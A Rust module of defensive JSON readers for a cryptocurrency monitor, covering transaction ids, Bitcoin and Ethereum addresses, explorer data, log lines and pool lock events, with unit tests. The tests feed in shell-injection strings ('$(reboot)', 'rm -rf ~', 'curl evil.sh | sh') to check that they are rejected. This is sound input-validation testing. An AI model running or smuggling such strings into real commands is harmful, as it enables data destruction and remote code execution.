//! The readers of the provider's and the board's JSON that every monitor needs. None of that JSON is a stable
//! interface, so each is lenient: a missing field is zero or empty, and what may reach a command or a URL is held
//! to the characters it can be made of.

use super::model::{Asset, ChainTx, Coin, DUST, Health, Level, Outlook, PoolLock};
use crate::fmt::short;
use serde_json::Value;

/// A whole number the provider writes as a string ("24900000000") or a number.
pub fn units(v: &Value) -> Option<u128> {
    match v {
        Value::String(s) => s.parse().ok(),
        Value::Number(n) => n.as_u64().map(u128::from),
        _ => None,
    }
}

pub fn field(v: &Value, key: &str) -> u128 {
    v.get(key).and_then(units).unwrap_or(0)
}

/// A count or a time: one too large to hold is the largest there is, never its low bits.
pub fn small(v: &Value, key: &str) -> u64 {
    u64::try_from(field(v, key)).unwrap_or(u64::MAX)
}

/// An asset id: 64 hex digits, with or without "0x". The provider writes it both ways.
pub fn asset(v: &Value, key: &str) -> Option<Asset> {
    let hex = v.get(key)?.as_str()?;
    let hex = hex.strip_prefix("0x").unwrap_or(hex);
    if hex.len() != 64 || !hex.is_ascii() {
        return None;
    }
    let mut id = [0u8; 32];
    for (i, byte) in id.iter_mut().enumerate() {
        *byte = u8::from_str_radix(hex.get(i * 2..i * 2 + 2)?, 16).ok()?;
    }
    Some(Asset(id))
}

pub fn text(v: &Value, key: &str) -> String {
    v.get(key).and_then(Value::as_str).unwrap_or("").to_string()
}

/// A transaction id: 64 hex digits, lower case. These end up in commands the operator runs and in an explorer's
/// URL, so nothing else is kept.
pub fn txid_text(id: &str) -> Option<String> {
    (id.len() == 64 && id.bytes().all(|b| b.is_ascii_hexdigit())).then(|| id.to_ascii_lowercase())
}

pub fn txid(v: &Value, key: &str) -> Option<String> {
    txid_text(v.get(key)?.as_str()?)
}

/// 32 bytes as an Ethereum node or a swap record writes them: 64 hex digits, with or without `0x`. Lower case, bare.
pub fn word32(s: &str) -> Option<String> {
    txid_text(s.strip_prefix("0x").unwrap_or(s))
}

/// An Ethereum address, lower case, or `None`. It goes into a request body the operator's RPC reads.
pub fn eth_address(s: &str) -> Option<String> {
    let hex = s.strip_prefix("0x")?;
    (hex.len() == 40 && hex.bytes().all(|b| b.is_ascii_hexdigit())).then(|| format!("0x{}", hex.to_ascii_lowercase()))
}

/// A quantity as an Ethereum node writes one: `0x` and hex digits.
pub fn quantity(v: &Value) -> Option<u64> {
    u64::from_str_radix(v.as_str()?.strip_prefix("0x")?, 16).ok()
}

/// A bech32 Bitcoin address, or `None`. These end up in commands too: the character set rules out anything a shell reads.
pub fn btc_address(s: &str) -> Option<String> {
    let hrp = ["bc1", "tb1", "bcrt1"].iter().any(|h| s.starts_with(h));
    (hrp && (14..=90).contains(&s.len()) && s.bytes().all(|b| b.is_ascii_lowercase() || b.is_ascii_digit())).then(|| s.to_string())
}

pub fn health(v: &Value) -> Health {
    Health { ok: v.get("ok").and_then(Value::as_bool).unwrap_or(false), error: text(v, "error") }
}

/// "2026-11-24T05:51:50.890Z" as seconds since 1970. UTC only, which is what the provider writes.
pub fn epoch(ts: &str) -> Option<u64> {
    let n = |r: std::ops::Range<usize>| ts.get(r)?.parse::<u64>().ok();
    let (y, m, d, h, mi, s) = (n(0..4)?, n(5..7)?, n(8..10)?, n(11..13)?, n(14..16)?, n(17..19)?);
    if y < 1970 || !(1..=12).contains(&m) || !(1..=31).contains(&d) || h > 23 || mi > 59 || s > 60 {
        return None;
    }
    // days from the civil date, counting years from March so the leap day falls last
    let (y, m) = if m <= 2 { (y - 1, m + 9) } else { (y, m - 3) };
    let days = y * 365 + y / 4 - y / 100 + y / 400 + (m * 153 + 2) / 5 + d - 1;
    Some((days.checked_sub(719_468)?) * 86_400 + h * 3600 + mi * 60 + s)
}

/// The most of one line that is kept for the screen. Thousands of lines are held, so this is far under what is read.
pub const MAX_KEPT: usize = 2048;

/// Cut at `MAX_KEPT` bytes, on a character boundary, with a mark that it was cut.
pub fn kept(mut s: String) -> String {
    if s.len() > MAX_KEPT {
        let mut end = MAX_KEPT;
        while !s.is_char_boundary(end) {
            end -= 1;
        }
        s.truncate(end);
        s.push('…');
    }
    s
}

/// What every line of the provider's JSON log starts with: when it was written ("HH:MM:SS" and seconds since 1970,
/// where the line says) and how loud it is.
pub fn log_head(v: &Value) -> (String, Option<u64>, Level) {
    let level = match text(v, "level").as_str() {
        "warn" => Level::Warn,
        "alert" | "error" => Level::Alert,
        _ => Level::Info,
    };
    let ts = v.get("ts").and_then(Value::as_str);
    // "2026-11-24T05:51:50.890Z" -> "05:51:50"
    (ts.and_then(|t| t.get(11..19)).unwrap_or("--:--:--").to_string(), ts.and_then(epoch), level)
}

/// The rest of a log line as "key value" pairs, with long hex made short. `amount` says how a whole number under a
/// key is written when that key carries an amount, in whatever the monitor counts in; `None` leaves it as it is.
pub fn log_detail(msg: &str, v: &Value, amount: fn(&str, u128) -> Option<String>) -> String {
    if msg == "swap" {
        return format!("{}  {} → {}", short(&text(v, "id"), 8, 4), text(v, "from"), text(v, "to"));
    }
    let Some(obj) = v.as_object() else { return String::new() };
    let mut parts = Vec::new();
    for (k, val) in obj {
        if matches!(k.as_str(), "ts" | "level" | "msg") {
            continue;
        }
        let s = match val {
            Value::Null | Value::Object(_) => continue,
            Value::Array(a) => format!("[{}]", a.len()),
            _ if units(val).and_then(|u| amount(k, u)).is_some() => units(val).and_then(|u| amount(k, u)).unwrap_or_default(),
            Value::String(s) if s.len() > 24 && s.chars().all(|c| c.is_ascii_hexdigit() || c == 'x') => short(s, 8, 6),
            Value::String(s) => s.clone(),
            other => other.to_string(),
        };
        parts.push(format!("{k} {s}"));
    }
    parts.join("  ")
}

/// An explorer's list of unspent outputs. An entry without a readable id, index or value is dropped: a coin
/// that cannot be named cannot be put in a command.
pub fn coins(v: &Value) -> Option<Vec<Coin>> {
    let list = v.as_array()?;
    Some(
        list.iter()
            .filter_map(|c| {
                Some(Coin {
                    txid: txid(c, "txid")?,
                    vout: u32::try_from(c.get("vout")?.as_u64()?).ok()?,
                    sats: c.get("value")?.as_u64()?,
                    confirmed: c.get("status").and_then(|s| s.get("confirmed")).and_then(Value::as_bool).unwrap_or(false),
                })
            })
            .collect(),
    )
}

/// One transaction as an explorer gives it. With `address`, what it pays to and spends from that address is summed.
/// `None` without a readable id, fee or weight: a transaction with no fee rate cannot be judged stuck or not.
pub fn chain_tx(v: &Value, address: Option<&str>) -> Option<ChainTx> {
    let status = v.get("status");
    let confirmed = status.and_then(|s| s.get("confirmed")).and_then(Value::as_bool).unwrap_or(false);
    let at = |s: &Value, key: &str| if confirmed { s.get(key).and_then(Value::as_u64) } else { None };
    let mine = |o: &Value| address.is_some() && o.get("scriptpubkey_address").and_then(Value::as_str) == address;
    let sats = |o: &Value| o.get("value").and_then(Value::as_u64).unwrap_or(0);
    let list = |key: &str| v.get(key).and_then(Value::as_array).map(Vec::as_slice).unwrap_or_default();
    let outputs = || list("vout").iter().filter(|o| mine(o));
    let spends_note = address.is_some() && list("vin").iter().filter_map(|i| i.get("prevout")).any(|o| mine(o) && sats(o) <= DUST);
    let away = |o: &Value| !mine(o) && sats(o) <= DUST && o.get("scriptpubkey_address").is_some_and(Value::is_string);
    Some(ChainTx {
        txid: txid(v, "txid")?,
        fee: v.get("fee")?.as_u64()?,
        vsize: v.get("weight")?.as_u64()?.div_ceil(4),
        height: status.and_then(|s| at(s, "block_height")),
        time: status.and_then(|s| at(s, "block_time")),
        received: outputs().map(sats).fold(0, u64::saturating_add),
        sent: list("vin").iter().filter_map(|i| i.get("prevout")).filter(|o| mine(o)).map(sats).fold(0, u64::saturating_add),
        note: outputs().any(|o| sats(o) <= DUST),
        // a transaction has a handful of outputs: one with more is not asked about past the first few
        notes_away: if spends_note { (0u32..).zip(list("vout")).filter(|(_, o)| away(o)).map(|(n, _)| n).take(4).collect() } else { Vec::new() },
    })
}

/// An explorer's list of an address's transactions. An entry that cannot be read is dropped.
pub fn history(v: &Value, address: &str) -> Option<Vec<ChainTx>> {
    Some(v.as_array()?.iter().filter_map(|t| chain_tx(t, Some(address))).collect())
}

/// The tip's height and the explorer's fee estimates (sats per virtual byte, by blocks to wait). `None` without the
/// height or the six-block estimate.
pub fn outlook(tip: &Value, fees: &Value) -> Option<Outlook> {
    let hour = fees.get("6")?.as_f64().filter(|r| r.is_finite() && *r >= 0.0)?;
    // a float-to-integer cast stops at the largest value, it never wraps
    Some(Outlook { tip: tip.as_u64()?, hour_milli: (hour * 1000.0).round() as u64 })
}

/// `LockLeavesInserted(uint256 indexed firstLockIndex, bytes32[] lockLeaves)`, the pool's event for locks put into it.
pub const LOCK_LEAVES_TOPIC: &str = "0x18df91ea83f965ece7a17fbab444175c3b2fd487524b95576215d8113d0b8662";

/// The most leaves read from one log entry. A settle carries a handful.
const MAX_LEAVES: usize = 256;

/// The locks in an `eth_getLogs` answer: one per leaf of each entry that is the pool's lock event, in the answer's
/// order. `None` when the answer is not a list. An entry from another contract, of another event, taken back by a
/// reorganisation, or not laid out as the event is, is left out: the node is not trusted to have filtered.
pub fn pool_locks(v: &Value, pool: &str) -> Option<Vec<PoolLock>> {
    let mut out = Vec::new();
    for log in v.as_array()? {
        let named = |key: &str| log.get(key).and_then(Value::as_str);
        let ours = named("address").and_then(eth_address).is_some_and(|a| a == pool);
        let event = log.get("topics").and_then(|t| t.get(0)).and_then(Value::as_str).is_some_and(|t| t.eq_ignore_ascii_case(LOCK_LEAVES_TOPIC));
        if !ours || !event || log.get("removed").and_then(Value::as_bool) == Some(true) {
            continue;
        }
        let (Some(tx), Some(block), Some(data)) = (named("transactionHash").and_then(word32), log.get("blockNumber").and_then(quantity), named("data")) else {
            continue;
        };
        // one dynamic array: where it starts (32), how many it holds, then the leaves
        let words: Vec<&str> = data.strip_prefix("0x").unwrap_or(data).as_bytes().chunks(64).filter_map(|w| std::str::from_utf8(w).ok()).collect();
        let count = words.get(1).and_then(|n| usize::from_str_radix(n, 16).ok());
        if words.first().and_then(|w| u64::from_str_radix(w, 16).ok()) != Some(32) || count != Some(words.len().saturating_sub(2)) || count > Some(MAX_LEAVES) {
            continue;
        }
        let time = log.get("blockTimestamp").and_then(quantity);
        out.extend(words[2..].iter().filter_map(|w| word32(w)).map(|leaf| PoolLock { leaf, tx: format!("0x{tx}"), block, time }));
    }
    Some(out)
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn what_goes_into_a_command_or_a_url_is_held_to_its_characters() {
        let (id, address, account) = ("AB".repeat(32), "bc1qexampleaddress000000000000000000000000", format!("0x{}", "Ab".repeat(20)));

        let read = (txid_text(&id), btc_address(address), eth_address(&account), txid_text("$(reboot)"), btc_address("bc1q; rm -rf ~"), eth_address("0x12"));

        assert_eq!(read, (Some("ab".repeat(32)), Some(address.to_string()), Some(format!("0x{}", "ab".repeat(20))), None, None, None));
    }

    #[test]
    fn a_log_lines_head_is_read_and_an_amount_is_written_as_the_monitor_says() {
        let line = json!({ "ts": "2026-11-24T05:51:50.890Z", "level": "error", "msg": "capacity", "held": "250", "open": 2, "key": "ab".repeat(20) });

        let (head, detail) = (log_head(&line), log_detail("capacity", &line, |k, u| (k == "held").then(|| format!("{u} units"))));

        assert_eq!(head, ("05:51:50".to_string(), Some(1_795_499_510), Level::Alert));
        assert_eq!(detail, "held 250 units  key abababab…ababab  open 2");
    }

    #[test]
    fn coins_that_cannot_be_named_in_a_command_are_dropped() {
        let id = "1234abcd1234abcd1234abcd1234abcd1234abcd1234abcd1234abcd1234abcd";
        let listed = json!([
            { "txid": id, "vout": 1, "value": 19500, "status": { "confirmed": true } },
            { "txid": "a24f; curl evil.sh | sh", "vout": 0, "value": 50000, "status": { "confirmed": true } },
            { "txid": id, "vout": 4294967296u64, "value": 1 },
            { "txid": id, "vout": 2, "value": 546 },
        ]);

        let c = coins(&listed).expect("a list");

        assert_eq!(
            c.iter().map(|c| (c.outpoint(), c.sats, c.confirmed)).collect::<Vec<_>>(),
            [(format!("{id}:1"), 19500, true), (format!("{id}:2"), 546, false)]
        );
    }

    #[test]
    fn a_transaction_is_summed_for_the_address_it_was_listed_for() {
        let out = |to: &str, value: u64| json!({"scriptpubkey_address": to, "value": value});
        let tx = json!({"txid": "ab".repeat(32), "fee": 500, "weight": 1718,
            "status": {"confirmed": true, "block_height": 900_000, "block_time": 1_700_000_000},
            "vin": [{"prevout": out("bc1qmine", 40_000)}, {"prevout": out("bc1qother", 9)}],
            "vout": [out("bc1qmine", 546), out("bc1qmine", 30_000), out("bc1qother", 8_963)]});

        let (mine, by_id) = (chain_tx(&tx, Some("bc1qmine")).expect("a transaction"), chain_tx(&tx, None).expect("a transaction"));

        assert_eq!((mine.received, mine.sent, mine.note, mine.vsize, mine.height, mine.time), (30_546, 40_000, true, 430, Some(900_000), Some(1_700_000_000)));
        assert_eq!((by_id.received, by_id.sent, by_id.note, by_id.rate_milli()), (0, 0, false, Some(1_162)));
    }

    #[test]
    fn an_unconfirmed_transaction_has_no_block_whatever_the_answer_carries_and_one_without_a_fee_is_dropped() {
        let unconfirmed = json!({"txid": "ab".repeat(32), "fee": 1, "weight": 4, "status": {"confirmed": false, "block_height": 5}});
        let no_fee = json!([{"txid": "cd".repeat(32), "weight": 4}, {"txid": "not an id", "fee": 1, "weight": 4}]);

        let (tx, list) = (chain_tx(&unconfirmed, None).expect("a transaction"), history(&no_fee, "bc1qmine"));

        assert_eq!((tx.height, list), (None, Some(vec![])));
    }

    #[test]
    fn the_outlook_needs_the_tip_and_the_hour_estimate() {
        let fees = json!({"1": 3.521, "6": 1.694});

        let (read, no_tip, no_hour, hostile) =
            (outlook(&json!(977_529), &fees), outlook(&json!("x"), &fees), outlook(&json!(1), &json!({"1": 2.0})), outlook(&json!(1), &json!({"6": -1.0})));

        assert_eq!((read, no_tip, no_hour, hostile), (Some(Outlook { tip: 977_529, hour_milli: 1_694 }), None, None, None));
    }

    #[test]
    fn a_note_leaving_the_address_is_named_by_its_output_and_one_that_spends_no_note_of_the_address_is_not() {
        let out = |address: &str, value: u64| json!({"scriptpubkey_address": address, "value": value});
        let tx = |spent: u64| {
            json!({"txid": "a".repeat(64), "fee": 200, "weight": 800, "status": {"confirmed": false},
                "vin": [{"prevout": out("bc1qother", 1046)}, {"prevout": out("bc1qmine", spent)}],
                "vout": [out("bc1qstranger", 546), out("bc1qmine", 546), out("bc1qstranger", 9_000), {"value": 0}]})
        };

        let (note, coin) = (chain_tx(&tx(546), Some("bc1qmine")).expect("a transaction"), chain_tx(&tx(5_000), Some("bc1qmine")).expect("a transaction"));
        let by_id = chain_tx(&tx(546), None).expect("a transaction");

        assert_eq!((note.notes_away, coin.notes_away, by_id.notes_away), (vec![0], vec![], vec![]));
    }

    #[test]
    fn the_pools_locks_are_read_leaf_by_leaf_and_an_entry_that_is_not_the_pools_lock_event_is_left_out() {
        let (pool, leaf) = (format!("0x{}", "ab".repeat(20)), |c: &str| c.repeat(64));
        // one array of two leaves: where it starts, how many, then the leaves
        let data = format!("0x{:064x}{:064x}{}{}", 32, 2, leaf("1"), leaf("2"));
        let entry = |address: &str, topic: &str, data: &str, removed: bool| {
            json!({"address": address, "topics": [topic, leaf("0")], "data": data, "removed": removed,
                "transactionHash": format!("0x{}", leaf("C")), "blockNumber": "0x10", "blockTimestamp": "0x20"})
        };
        let logs = json!([
            entry(&pool.to_uppercase().replace("0X", "0x"), LOCK_LEAVES_TOPIC, &data, false),
            entry("0x0000000000000000000000000000000000000001", LOCK_LEAVES_TOPIC, &data, false),
            entry(&pool, &format!("0x{}", leaf("9")), &data, false),
            entry(&pool, LOCK_LEAVES_TOPIC, &data, true),
            entry(&pool, LOCK_LEAVES_TOPIC, &format!("0x{:064x}{:064x}{}", 32, 2, leaf("1")), false),
        ]);

        let (locks, not_a_list) = (pool_locks(&logs, &pool).expect("a list"), pool_locks(&json!({}), &pool));

        let lock = |l: &str| PoolLock { leaf: leaf(l), tx: format!("0x{}", leaf("c")), block: 16, time: Some(32) };
        assert_eq!((locks, not_a_list), (vec![lock("1"), lock("2")], None));
    }
}
